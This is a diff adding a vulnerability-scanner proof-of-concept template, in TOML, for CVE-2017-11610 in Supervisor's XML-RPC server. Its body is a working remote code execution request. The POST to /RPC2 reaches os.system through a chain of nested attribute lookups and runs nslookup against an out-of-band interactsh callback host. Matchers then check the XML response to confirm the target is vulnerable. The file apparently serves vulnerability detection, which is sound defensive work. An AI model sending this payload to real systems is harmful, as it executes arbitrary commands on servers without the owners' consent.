@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "Supervisor 3.0a1-3.3.2 XML-RPC 服务器存在远程代码执行漏洞，认证用户可通过嵌套命名空间查找执行任意命令"
+id = "POC-AVE-2017-0026"
+name = "CVE-2017-11610 Supervisor XML-RPC RCE PoC"
+severity = "high"
+tags = ["ave-2017-0026"]
+vuln_id = [
+    "CVE-2017-11610",
+    "AVE-2017-0026",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/RPC2"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
+  <params>
+    <param>
+      <string>nslookup {{interactsh-url}}</string>
+    </param>
+  </params>
+</methodCall>"""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/xml"
+Content-Type = "text/xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/xml"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<methodResponse>",
+    "<int>",
+]
